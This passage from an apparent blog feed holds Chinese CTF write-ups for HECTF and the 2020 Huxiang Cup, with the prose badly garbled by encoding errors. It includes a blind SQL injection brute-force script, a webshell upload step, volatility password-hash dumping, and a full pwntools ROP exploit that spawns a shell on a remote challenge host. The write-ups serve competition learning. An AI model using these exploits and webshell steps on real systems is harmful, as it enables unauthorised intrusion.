punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ç¬¬"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"ä½----------->"</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># çˆ†å¯†ç å°±æŠŠusernameæ”¹æˆpassword</span></code></pre><p>çˆ†username</p><img src="/article/2020-HECTF-Write-up/image-20201129162416104.png" class="" title="image-20201129162416104" loading="lazy"><p>æœç„¶æ˜¯admin</p><p>ç»§ç»­çˆ†password</p><img src="/article/2020-HECTF-Write-up/image-20201129161907953.png" class="" title="image-20201129161907953" loading="lazy"><p>ç»“æœpassword=339db714647a1d66b85cd08442287841</p><p>ç™»å½•ä¸€ä¸‹ï¼Œè·å¾—flag</p><img src="/article/2020-HECTF-Write-up/image-20201129161946397.png" class="" title="image-20201129161946397" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hxb-Writeup</title>
      <link href="article/2020hxb-Writeup-cOMING/"/>
      <url>article/2020hxb-Writeup-cOMING/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¹–æ¹˜æ¯2020"><a href="#æ¹–æ¹˜æ¯2020" class="headerlink" title="æ¹–æ¹˜æ¯2020"></a>æ¹–æ¹˜æ¯2020</h1><p>é˜Ÿä¼æƒ…å†µ</p><p>é˜Ÿä¼åç§°ï¼šcOMING</p><img src="/article/2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png" class="" loading="lazy"><p>é˜Ÿä¼æˆå‘˜</p><p>gyy,Trick,hxq</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„"><a href="#é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„" class="headerlink" title="é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„"></a>é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„</h3><p>ç›´æ¥ç™½ç»™phpinfo <a href="http://47.111.104.169:57301/?file=phpinfo">http://47.111.104.169:57301/?file=phpinfo</a></p><img src="/article/2020hxb-Writeup-cOMING/3374b2c0d3129c0282de5d456026c0f9.png" class="" loading="lazy"><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>è¿›ç½‘ç«™æ‰¾åå°./admin/<br>è¾“å…¥ç”¨æˆ·åå¯†ç å‡ä¸ºadminç™»é™†æˆåŠŸ,htmlå‘ç°æœ‰/?r=manageinfoï¼Œè¿›å…¥æ”¹å¤´åƒï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿ä¸Šå¯å¾—flag</p><img src="/article/2020hxb-Writeup-cOMING/031b1eb11298e4c672f6e91a3b07b170.png" class="" loading="lazy"><p>91d7fbeecf940113dfca79a0194d8292</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p><code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw  imageinfo</code></p><img src="/article/2020hxb-Writeup-cOMING/7b3aaf83f2a475ad5cab06c8856973c4.png" class="" loading="lazy"><p>å†…å­˜å–è¯ win7ï¼š <code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></p><img src="/article/2020hxb-Writeup-cOMING/4d11382c75521a279254c1d8f939e7e2.png" class="" loading="lazy"><p>MD5è§£å‡º</p><p>CTFï¼š</p><p>aad3â€¦ï¼šç©ºå¯†ç </p><p>0a64â€¦:qwer1234</p><p>å†ç»“åˆé¢˜ç›®ï¼šwe need sha1(password)!!! sha1</p><p>è§£å¯†qwer1234</p><img src="/article/2020hxb-Writeup-cOMING/ee50c0fb45bc04ff9f82fad1289d5ec8.png" class="" loading="lazy"><p>å‡ºflag</p><h3 id="è™šå®ä¹‹é—´"><a href="#è™šå®ä¹‹é—´" class="headerlink" title="è™šå®ä¹‹é—´"></a>è™šå®ä¹‹é—´</h3><p>å¼€æ–‡ä»¶å‘ç°<code>mingwen - å‰¯æœ¬.txt</code>æ˜¯ä¼ªåŠ å¯†,æ‹–å‡ºæ¥æ‰“åŒ…åæ˜æ–‡æ”»å‡»</p><p>çˆ†ç ´å¾—å¯†ç ï¼š123%asd!O</p><img src="/article/2020hxb-Writeup-cOMING/1a7883d1491cfe53eb8d922f1251ee04.png" class="" loading="lazy"><pre class="language-none"><code class="language-none">ä»…éœ€5ï¼Œè·³è¿‡å»ffd5e341le25b2dcab15cbb&#125;gc3bc5b&#123;789b51</code></pre><p>è”æƒ³æ …æ åŠ å¯† ç›´æ¥å‡ºflag</p><img src="/article/2020hxb-Writeup-cOMING/b510b2e1aae50a2ba791f6bac42dcdc2.png" class="" loading="lazy"><h3 id="é¢œæ–‡å­—"><a href="#é¢œæ–‡å­—" class="headerlink" title="é¢œæ–‡å­—"></a>é¢œæ–‡å­—</h3><p>ä¸œè¥¿å¾ˆå¤šï¼Œæœ€ç»ˆå‘ç°è¿™æœ‰ä¸ª.htmlæ˜¯æœ‰ç”¨çš„</p><img src="/article/2020hxb-Writeup-cOMING/9302d47555b72dfa1fd14d8a8b8394e2.png" class="" loading="lazy"><p>æ‰“å¼€ï¼ŒF12</p><img src="/article/2020hxb-Writeup-cOMING/f2ffd31423755c064eb38a0e7dc062f5.png" class="" loading="lazy"><p>å‘ç°base64</p><pre class="language-none"><code class="language-none">KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm&#x3D;&#x3D;KO+8oF&#x2F;vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr&#x3D;&#x3D;                            KCtfKyk&#x2F;KOOAgj7vuL88KV&#x2F;OuCjjgII+77i&#x2F;PClfzrgK                                  bygq77+j4pa977+jKinjg5bjgpwK                                      77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K                  44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp&#x3D;                    KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp&#x3D;&#x3D;flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC&#x2F;wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp&#x3D;4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn&#x3D;&#x3D;                     4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCp&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KMKsX8KsIiko77+j77mP77+j77ybKSjila&#x2F;CsOKWocKw77yJ4pWv77i1IOKUu+KUgeKUu+ODvSjjgpzilr3jgpzjgIAp77yNQzwoLzvil4c7KS9+KOODmO+9pV&#x2F;vvaUp44OY4pSz4pSB4pSzCu&#x3D;&#x3D;4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCo&#x3D;&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIMK4oqZ77mP4oqZ4oil44O9KCrjgII+0JQ8KW&#x2F;jgpwvKOOEkm&#x2F;jhJIpL35+KCNfPC0p77yI77ye5Lq677yc77yb77yJCo&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCm&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCs&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAp&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCr&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCt&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAr&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCi&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCn&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCp&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCq&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCl&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi&#x3D;&#x3D;KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                     KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK                   KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIK             KOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila&#x2F;ngrjlvLnvvIHigKLigKLigKIKZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC&#x3D;&#x3D;</code></pre><p>è§£å¯†åï¼š</p><pre class="language-none"><code class="language-none">(ï½¡ï½¥âˆ€ï½¥)ï¾‰ï¾å—¨Hi~ (ï¼ _ï¼ ;)(ï¼ _ï¼ ;)(ï¼ _ï¼ ;)(+_+)?(ã€‚&gt;ï¸¿&lt;)_Î¸(ã€‚&gt;ï¸¿&lt;)_Î¸o(*ï¿£â–½ï¿£*)ãƒ–ã‚œï¼œï¼ˆï¼¾ï¼ï¼¾ï¼‰ï¼(â•¯â–½â•° )å¥½é¦™~~ãƒ½(âœ¿ï¾Ÿâ–½ï¾Ÿ)ãƒ(ï¼ ï¼¾ï¼ï¼¾)(^^ã‚Î¨(ï¿£âˆ€ï¿£)Î¨*â˜…,Â°*:.â˜†(ï¿£â–½ï¿£)&#x2F;$:*.Â°â˜…* ã€‚~\(â‰§â–½â‰¦)&#x2F;~o(^â–½^)o(Â¬â€¿Â¬)(*â‰§ï¸¶â‰¦))(ï¿£â–½ï¿£* )ã‚â”³â”â”³(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»â”³â”â”³ ãƒ( ã‚œ-ã‚œãƒ)à² _à² à² _à² (â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—(Â¬_Â¬ )(ãƒã¸ï¿£ã€)o(ï¿£â”°ï¿£*)ã‚â•°(è‰¹çš¿è‰¹ )ï¼ˆï¸¶^ï¸¶ï¼‰(* ï¿£ï¸¿ï¿£)(ï¿£Îµ(#ï¿£)(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ &#x3D;3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½(ã€€Tãƒ­T)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€(Â¬_Â¬&quot;)(ï¿£ï¹ï¿£ï¼›)(â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»ãƒ½(ã‚œâ–½ã‚œã€€)ï¼C&lt;(&#x2F;;â—‡;)&#x2F;~(ãƒ˜ï½¥_ï½¥)ãƒ˜â”³â”â”³à² _à² (â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—(Â¬_Â¬ )(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3&lt;( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½(ã€€Tãƒ­T)Ïƒ(ã€ƒâŠ™ï¹âŠ™âˆ¥ãƒ½(*ã€‚&gt;Ğ”&lt;)oã‚œ&#x2F;(ã„’oã„’)&#x2F;~~(#_&lt;-)ï¼ˆï¼äººï¼œï¼›ï¼‰(ãƒã¸ï¿£ã€)o(ï¿£â”°ï¿£*)ã‚â•°(è‰¹çš¿è‰¹ )ï¼ˆï¸¶^ï¸¶ï¼‰(* ï¿£ï¸¿ï¿£)(ï¿£Îµ(#ï¿£)(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ &#x3D;3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½(ã€€Tãƒ­T)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3&lt;( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½(ã€€Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)(oï¾Ÿvï¾Ÿ)ãƒd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(ï¿£â–½ï¿£*)bÎµ&#x3D;Îµ&#x3D;Îµ&#x3D;(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ &#x3D;3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½(ã€€Tãƒ­T)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3&lt;( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½(ã€€Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)(oï¾Ÿvï¾Ÿ)ãƒd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(ï¿£â–½ï¿£*)bÎµ&#x3D;Îµ&#x3D;Îµ&#x3D;(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ &#x3D;3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½(ã€€Tãƒ­T)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3&lt;( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½(ã€€Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)(oï¾Ÿvï¾Ÿ)ãƒd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(ï¿£â–½ï¿£*)bÎµ&#x3D;Îµ&#x3D;Îµ&#x3D;(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ &#x3D;3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½(ã€€Tãƒ­T)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3&lt;( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½(ã€€Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)(oï¾Ÿvï¾Ÿ)ãƒd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(ï¿£â–½ï¿£*)bÎµ&#x3D;Îµ&#x3D;Îµ&#x3D;(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U(oï¾Ÿvï¾Ÿ)ãƒd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(ï¿£â–½ï¿£*)bÎµ&#x3D;Îµ&#x3D;Îµ&#x3D;(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ &#x3D;3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½(ã€€Tãƒ­T)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ&lt;( â€µâ–¡â€²)&gt;â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3&lt;( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½(ã€€Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)(oï¾Ÿvï¾Ÿ)ãƒd&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(ï¿£â–½ï¿£*)bÎµ&#x3D;Îµ&#x3D;Îµ&#x3D;(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢flagè¢«æˆ‘ç‚¸æ²¡äº†å“ˆå“ˆå“ˆ</code></pre><p>ç©ºæ ¼å’Œbase64åŠ å¯†çš„é¢œæ–‡å­—</p><p>stegsnowè§£å‡ºç°ä¹±ç </p><p>æ‹¿é¢œæ–‡å­—çš„base64è·‘base64éšå†™ï¼Œå¾—åˆ°ç§˜é’¥<code>lorrie</code></p><p>è¿åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šncä¿å­˜æ–‡ä»¶</p><img src="/article/2020hxb-Writeup-cOMING/24f08c5af60b185a313ee1463c9a4852.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/113c837089faeae4e4cbf169b26103f2.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/a6cd84af9e66703249e6d040b8378d79.png" class="" loading="lazy"><p><code>â†’_â†’</code>æ›¿æ¢ä¸º<code>-</code>,<code>â†_â†</code>æ›¿æ¢ä¸º<code>.</code>,å»ç½‘ç«™ä¸Šè§£ç </p><img src="/article/2020hxb-Writeup-cOMING/4be4b33a5bdc0c72d555bcf347fc81dd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/f9ede18047cccbfc556a9c345a0beac0.png" class="" loading="lazy"><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="å¤å…¸ç¾"><a href="#å¤å…¸ç¾" class="headerlink" title="å¤å…¸ç¾++"></a>å¤å…¸ç¾++</h3><p>åˆ©ç”¨ç½‘ç«™å·¥å…·å¾—ç»´å‰å°¼äºšå¯†ç å¯†é’¥</p><img src="/article/2020hxb-Writeup-cOMING/7623653b8d5fa7474f7a021105bcc064.png" class="" loading="lazy"><p>ä¸º<code>orderby</code> ç”ŸæˆMD5</p><img src="/article/2020hxb-Writeup-cOMING/5ac8fcc0d5536abdee804959d8a3c242.png" class="" loading="lazy"><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h3><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *from LibcSearcher import *context.log_level &#x3D; &#39;debug&#39;context.terminal&#x3D;[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]p &#x3D; remote(&#39;47.111.96.55&#39;,54606)elf &#x3D; ELF(&#39;.&#x2F;pwn_printf&#39;)read_plt &#x3D; elf.symbols[&#39;read&#39;]read_got &#x3D; elf.got[&#39;read&#39;]puts_plt &#x3D; elf.symbols[&#39;puts&#39;]puts_got &#x3D; elf.got[&#39;puts&#39;]pop_rdi &#x3D; 0x401213v_addr &#x3D; 0x4007C6scanf &#x3D; 0x4006A0pop_rsi_ret &#x3D; 0x401211p.recvuntil(&quot;You will find this game very interesting&quot;)for i in range(16):    p.sendline(&quot;32&quot;)payload1 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(v_addr)p.sendline(payload1)p.recvline()rrr &#x3D; p.recv(6)puts_addr &#x3D; u64(rrr.ljust(8,b&#39;\x00&#39;))print (hex(puts_addr))wri &#x3D; 0x06030A0payload2 &#x3D; b&#39;a&#39;*0x8 + p64(pop_rdi) + p64(0x0401D99 ) +p64(pop_rsi_ret) +p64(wri)+p64(0)+ p64(scanf) + p64(pop_rdi) + p64(8*4 )+ p64(v_addr+1)p.recv()n1 &#x3D; int(b&#39;&#x2F;bin&#39;[::-1].hex(),16)n2 &#x3D; int(b&#39;&#x2F;sh\x00&#39;[::-1].hex(),16)p.sendline(payload2)print(&quot;n1:&quot; + str(n1))sleep(0.3)p.sendline(str(n1))wri &#x3D; 0x06030A0+4sleep(0.5)payload2 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(wri) + p64(0) + p64(scanf) + p64(v_addr)p.send(payload2)p.sendline(str(n2))payload3 &#x3D; b&#39;a&#39; * 0x8 + p64(pop_rdi) + p64(0x06030A0) + p64(puts_addr-0x2a300)sleep(0.5)p.sendline(payload3)p.interactive()</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>çˆ†ç ´ï¼Œé€ä¸ªå‡»ç ´ã€‚ã€‚ã€‚</p><p>easy_c++</p><p>IDAåˆ†æ ä¸€ä¸ªä¿¡æ¯</p><img src="/article/2020hxb-Writeup-cOMING/61a2caae7f31cbfc365432119425d6fd.png" class="" loading="lazy"><img src="/article/2020hxb-Writeup-cOMING/565ff985b4b771d98409ec3233eb8309.png" class="" loading="lazy"><p>é•¿åº¦32</p><img src="/article/2020hxb-Writeup-cOMING/17aa83fa3a88db01f27c8fb3d41c5e5f.png" class="" loading="lazy"><p>expï¼š</p><pre class="language-none"><code class="language-none">public class Test &#123;    public static void main(String[] args) &#123;        String a &#x3D; &quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;;        char v11;        int v13;        for (int i &#x3D;0; i&lt;32; i++)        &#123;            v11 &#x3D; a.charAt(i);            v13 &#x3D; i ^ (int)v11;            System.out.print((char)v13);        &#125;    &#125;&#125;</code></pre><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>åç¼–è¯‘py</p><pre class="language-none"><code class="language-none">python3 pyinstxtractor.py ReMe.exe</code></pre><img src="/article/2020hxb-Writeup-cOMING/1393ddb113bda2babe004c8a7bd44c13.png" class="" loading="lazy"><p>010æ‰“å¼€</p><img src="/article/2020hxb-Writeup-cOMING/38a8bb796f44edf49bb8ec9ae28a850c.png" class="" 